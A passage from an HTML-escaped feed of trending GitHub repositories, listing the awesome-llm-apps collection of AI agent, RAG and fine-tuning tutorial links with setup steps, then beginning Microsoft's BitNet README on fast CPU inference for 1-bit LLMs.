 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/ai_breakup_recovery_agent/"&gt;‚ù§Ô∏è‚Äçü©π AI Breakup Recovery Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/ai_data_analysis_agent/"&gt;üìä AI Data Analysis Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/ai_medical_imaging_agent/"&gt;ü©ª AI Medical Imaging Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/ai_meme_generator_agent_browseruse/"&gt;üòÇ AI Meme Generator Agent (Browser)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/ai_music_generator_agent/"&gt;üéµ AI Music Generator Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/ai_travel_agent/"&gt;üõ´ AI Travel Agent (Local &amp;amp; Cloud)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/gemini_multimodal_agent_demo/"&gt;‚ú® Gemini Multimodal Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/mixture_of_agents/"&gt;üîÑ Mixture of Agents&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/xai_finance_agent/"&gt;üìä xAI Finance Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/opeani_research_agent/"&gt;üîç OpenAI Research Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/starter_ai_agents/web_scrapping_ai_agent/"&gt;üï∏Ô∏è Web Scraping AI Agent (Local &amp;amp; Cloud SDK)&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üöÄ Advanced AI Agents&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_home_renovation_agent"&gt;üèöÔ∏è üçå AI Home Renovation Agent with Nano Banana Pro&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_deep_research_agent/"&gt;üîç AI Deep Research Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_vc_due_diligence_agent_team"&gt;üìä AI VC Due Diligence Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/research_agent_gemini_interaction_api"&gt;üî¨ AI Research Planner &amp;amp; Executor (Google Interactions API)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_consultant_agent"&gt;ü§ù AI Consultant Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_system_architect_r1/"&gt;üèóÔ∏è AI System Architect Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_financial_coach_agent/"&gt;üí∞ AI Financial Coach Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_movie_production_agent/"&gt;üé¨ AI Movie Production Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_investment_agent/"&gt;üìà AI Investment Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_health_fitness_agent/"&gt;üèãÔ∏è‚Äç‚ôÇÔ∏è AI Health &amp;amp; Fitness Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/product_launch_intelligence_agent"&gt;üöÄ AI Product Launch Intelligence Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_journalist_agent/"&gt;üóûÔ∏è AI Journalist Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_mental_wellbeing_agent/"&gt;üß† AI Mental Wellbeing Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/single_agent_apps/ai_meeting_agent/"&gt;üìë AI Meeting Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_Self-Evolving_agent/"&gt;üß¨ AI Self-Evolving Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_sales_intelligence_agent_team"&gt;üë®üèª‚Äçüíº AI Sales Intelligence Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/ai_news_and_podcast_agents/"&gt;üéß AI Social Media News and Podcast Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/accomplish-ai/openwork"&gt;üåê Openwork - Open Browser Automation Agent&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üéÆ Autonomous Game Playing Agents&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/autonomous_game_playing_agent_apps/ai_3dpygame_r1/"&gt;üéÆ AI 3D Pygame Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/autonomous_game_playing_agent_apps/ai_chess_agent/"&gt;‚ôú AI Chess Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/autonomous_game_playing_agent_apps/ai_tic_tac_toe_agent/"&gt;üé≤ AI Tic-Tac-Toe Agent&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;ü§ù Multi-agent Teams&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_competitor_intelligence_agent_team/"&gt;üß≤ AI Competitor Intelligence Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_finance_agent_team/"&gt;üí≤ AI Finance Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_game_design_agent_team/"&gt;üé® AI Game Design Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_legal_agent_team/"&gt;üë®‚Äç‚öñÔ∏è AI Legal Agent Team (Cloud &amp;amp; Local)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_recruitment_agent_team/"&gt;üíº AI Recruitment Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_real_estate_agent_team"&gt;üè† AI Real Estate Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_services_agency/"&gt;üë®‚Äçüíº AI Services Agency (CrewAI)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_teaching_agent_team/"&gt;üë®‚Äçüè´ AI Teaching Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/multimodal_coding_agent_team/"&gt;üíª Multimodal Coding Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/multimodal_design_agent_team/"&gt;‚ú® Multimodal Design Agent Team&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/multimodal_uiux_feedback_agent_team/"&gt;üé® üçå Multimodal UI/UX Feedback Agent Team with Nano Banana&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_ai_agents/multi_agent_apps/agent_teams/ai_travel_planner_agent_team/"&gt;üåè AI Travel Planner Agent Team&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üó£Ô∏è Voice AI Agents&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/voice_ai_agents/ai_audio_tour_agent/"&gt;üó£Ô∏è AI Audio Tour Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/voice_ai_agents/customer_support_voice_agent/"&gt;üìû Customer Support Voice Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/voice_ai_agents/voice_rag_openaisdk/"&gt;üîä Voice RAG Agent (OpenAI SDK)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/akshayaggarwal99/jarvis-ai-assistant"&gt;üéôÔ∏è OpenSource Voice Dictation Agent (like Wispr Flow&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;&lt;img src="https://cdn.simpleicons.org/modelcontextprotocol" alt="mcp logo" width="25" height="20" /&gt; MCP AI Agents&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/mcp_ai_agents/browser_mcp_agent/"&gt;‚ôæÔ∏è Browser MCP Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/mcp_ai_agents/github_mcp_agent/"&gt;üêô GitHub MCP Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/mcp_ai_agents/notion_mcp_agent"&gt;üìë Notion MCP Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/mcp_ai_agents/ai_travel_planner_mcp_agent_team"&gt;üåç AI Travel Planner MCP Agent&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üìÄ RAG (Retrieval Augmented Generation)&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/agentic_rag_embedding_gemma"&gt;üî• Agentic RAG with Embedding Gemma&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/agentic_rag_with_reasoning/"&gt;üßê Agentic RAG with Reasoning&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/ai_blog_search/"&gt;üì∞ AI Blog Search (RAG)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/autonomous_rag/"&gt;üîç Autonomous RAG&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/contextualai_rag_agent/"&gt;üîÑ Contextual AI RAG Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/corrective_rag/"&gt;üîÑ Corrective RAG (CRAG)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/deepseek_local_rag_agent/"&gt;üêã Deepseek Local RAG Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/gemini_agentic_rag/"&gt;ü§î Gemini Agentic RAG&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/hybrid_search_rag/"&gt;üëÄ Hybrid Search RAG (Cloud)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/llama3.1_local_rag/"&gt;üîÑ Llama 3.1 Local RAG&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/local_hybrid_search_rag/"&gt;üñ•Ô∏è Local Hybrid Search RAG&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/local_rag_agent/"&gt;ü¶ô Local RAG Agent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/rag-as-a-service/"&gt;üß© RAG-as-a-Service&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/rag_agent_cohere/"&gt;‚ú® RAG Agent with Cohere&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/rag_chain/"&gt;‚õìÔ∏è Basic RAG Chain&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/rag_database_routing/"&gt;üì† RAG with Database Routing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/rag_tutorials/vision_rag/"&gt;üñºÔ∏è Vision RAG&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üíæ LLM Apps with Memory Tutorials&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_apps_with_memory_tutorials/ai_arxiv_agent_memory/"&gt;üíæ AI ArXiv Agent with Memory&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_apps_with_memory_tutorials/ai_travel_agent_memory/"&gt;üõ©Ô∏è AI Travel Agent with Memory&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_apps_with_memory_tutorials/llama3_stateful_chat/"&gt;üí¨ Llama3 Stateful Chat&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_apps_with_memory_tutorials/llm_app_personalized_memory/"&gt;üìù LLM App with Personalized Memory&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_apps_with_memory_tutorials/local_chatgpt_with_memory/"&gt;üóÑÔ∏è Local ChatGPT Clone with Memory&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_apps_with_memory_tutorials/multi_llm_memory/"&gt;üß† Multi-LLM Application with Shared Memory&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üí¨ Chat with X Tutorials&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/chat_with_X_tutorials/chat_with_github/"&gt;üí¨ Chat with GitHub (GPT &amp;amp; Llama3)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/chat_with_X_tutorials/chat_with_gmail/"&gt;üì® Chat with Gmail&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/chat_with_X_tutorials/chat_with_pdf/"&gt;üìÑ Chat with PDF (GPT &amp;amp; Llama3)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/chat_with_X_tutorials/chat_with_research_papers/"&gt;üìö Chat with Research Papers (ArXiv) (GPT &amp;amp; Llama3)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/chat_with_X_tutorials/chat_with_substack/"&gt;üìù Chat with Substack&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/chat_with_X_tutorials/chat_with_youtube_videos/"&gt;üìΩÔ∏è Chat with YouTube Videos&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üéØ LLM Optimization Tools&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_optimization_tools/toonify_token_optimization/"&gt;üéØ Toonify Token Optimization&lt;/a&gt; - Reduce LLM API costs by 30-60% using TOON format&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_optimization_tools/headroom_context_optimization/"&gt;üß† Headroom Context Optimization&lt;/a&gt; - Reduce LLM API costs by 50-90% through intelligent context compression for AI agents (includes persistent memory &amp;amp; MCP support)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üîß LLM Fine-tuning Tutorials&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;img src="https://cdn.simpleicons.org/google" alt="google logo" width="20" height="15" /&gt; &lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_finetuning_tutorials/gemma3_finetuning/"&gt;Gemma 3 Fine-tuning&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;img src="https://cdn.simpleicons.org/meta" alt="meta logo" width="25" height="15" /&gt; &lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/advanced_llm_apps/llm_finetuning_tutorials/llama3.2_finetuning/"&gt;Llama 3.2 Fine-tuning&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üßë‚Äçüè´ AI Agent Framework Crash Course&lt;/h3&gt; 
&lt;p&gt;&lt;img src="https://cdn.simpleicons.org/google" alt="google logo" width="25" height="15" /&gt; &lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/ai_agent_framework_crash_course/google_adk_crash_course/"&gt;Google ADK Crash Course&lt;/a&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Starter agent; model‚Äëagnostic (OpenAI, Claude)&lt;/li&gt; 
 &lt;li&gt;Structured outputs (Pydantic)&lt;/li&gt; 
 &lt;li&gt;Tools: built‚Äëin, function, third‚Äëparty, MCP tools&lt;/li&gt; 
 &lt;li&gt;Memory; callbacks; Plugins&lt;/li&gt; 
 &lt;li&gt;Simple multi‚Äëagent; Multi‚Äëagent patterns&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;img src="https://cdn.simpleicons.org/openai" alt="openai logo" width="25" height="15" /&gt; &lt;a href="https://raw.githubusercontent.com/Shubhamsaboo/awesome-llm-apps/main/ai_agent_framework_crash_course/openai_sdk_crash_course/"&gt;OpenAI Agents SDK Crash Course&lt;/a&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Starter agent; function calling; structured outputs&lt;/li&gt; 
 &lt;li&gt;Tools: built‚Äëin, function, third‚Äëparty integrations&lt;/li&gt; 
 &lt;li&gt;Memory; callbacks; evaluation&lt;/li&gt; 
 &lt;li&gt;Multi‚Äëagent patterns; agent handoffs&lt;/li&gt; 
 &lt;li&gt;Swarm orchestration; routing logic&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üöÄ Getting Started&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Clone the repository&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/Shubhamsaboo/awesome-llm-apps.git 
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Navigate to the desired project directory&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd awesome-llm-apps/starter_ai_agents/ai_travel_agent
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Install the required dependencies&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Follow the project-specific instructions&lt;/strong&gt; in each project's &lt;code&gt;README.md&lt;/code&gt; file to set up and run the app.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;&lt;img src="https://cdn.simpleicons.org/github" alt="github logo" width="25" height="20" /&gt; Thank You, Community, for the Support! üôè&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://star-history.com/#Shubhamsaboo/awesome-llm-apps&amp;amp;Date"&gt;&lt;img src="https://api.star-history.com/svg?repos=Shubhamsaboo/awesome-llm-apps&amp;amp;type=Date" alt="Star History Chart" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;üåü &lt;strong&gt;Don‚Äôt miss out on future updates! Star the repo now and be the first to know about new and exciting LLM apps with RAG and AI Agents.&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microsoft/BitNet</title>
      <link>https://github.com/microsoft/BitNet</link>
      <description>&lt;p&gt;Official inference framework for 1-bit LLMs&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;bitnet.cpp&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://opensource.org/licenses/MIT"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true" alt="License: MIT" /&gt;&lt;/a&gt; &lt;img src="https://img.shields.io/badge/version-1.0-blue" alt="version" /&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://huggingface.co/microsoft/BitNet-b1.58-2B-4T"&gt;&lt;img src="https://raw.githubusercontent.com/microsoft/BitNet/main/assets/header_model_release.png" alt="BitNet Model on Hugging Face" width="800" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Try it out via this &lt;a href="https://bitnet-demo.azurewebsites.net/"&gt;demo&lt;/a&gt;, or build and run it on your own &lt;a href="https://github.com/microsoft/BitNet?tab=readme-ov-file#build-from-source"&gt;CPU&lt;/a&gt; or &lt;a href="https://github.com/microsoft/BitNet/raw/main/gpu/README.md"&gt;GPU&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;bitnet.cpp is the official inference framework for 1-bit LLMs (e.g., BitNet b1.58). It offers a suite of optimized kernels, that support &lt;strong&gt;fast&lt;/strong&gt; and &lt;strong&gt;lossless&lt;/strong&gt; inference of 1.58-bit models on CPU and GPU (NPU support will coming next).&lt;/p&gt; 
&lt;p&gt;The first release of bitnet.cpp is to support inference on CPUs. bitnet.cpp achieves speedups of &lt;strong&gt;1.37x&lt;/strong&gt; to &lt;strong&gt;5.07x&lt;/strong&gt; on ARM CPUs, with larger models experiencing greater performance gains. Additionally, it reduces energy consumption by &lt;strong&gt;55.4%&lt;/strong&gt; to &lt;strong&gt;70.0%&lt;/strong&gt;, further boosting overall efficiency. On x86 CPUs, speedups range from &lt;strong&gt;2.37x&lt;/strong&gt; to &lt;strong&gt;6.17x&lt;/strong&gt; with energy reductions between &lt;strong&gt;71.9%&lt;/strong&gt; to &lt;strong&gt;82.2%&lt;/strong&gt;. Furthermore, bitnet.cpp can run a 100B BitNet b1.58 model on a single CPU, achieving speeds comparable to human reading (5-7 tokens per second), significantly enhancing the potential for running LLMs on local devices. Please refer to the &lt;a href="https://arxiv.org/abs/2410.16144"&gt;technical report&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Latest optimization&lt;/strong&gt; introduces parallel kernel implementations with configurable tiling and embedding quantization support, achieving &lt;strong&gt;1.15x to 2.1x&lt;/strong&gt; additional speedup over the original implementation across different hardware platforms and workloads. For detailed technical information, see the &lt;a href="https://raw.githubusercontent.com/microsoft/BitNet/main/src/README.md"&gt;optimization guide&lt;/a&gt;.&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/microsoft/BitNet/main/assets/performance.png" alt="performance_comparison" width="800" /&gt; 
&lt;h2&gt;Demo&lt;/h2&gt; 
&lt;p&gt;A demo of bitnet.cpp running a BitNet b1.58 3B model on Apple M2:&lt;/p&gt; 
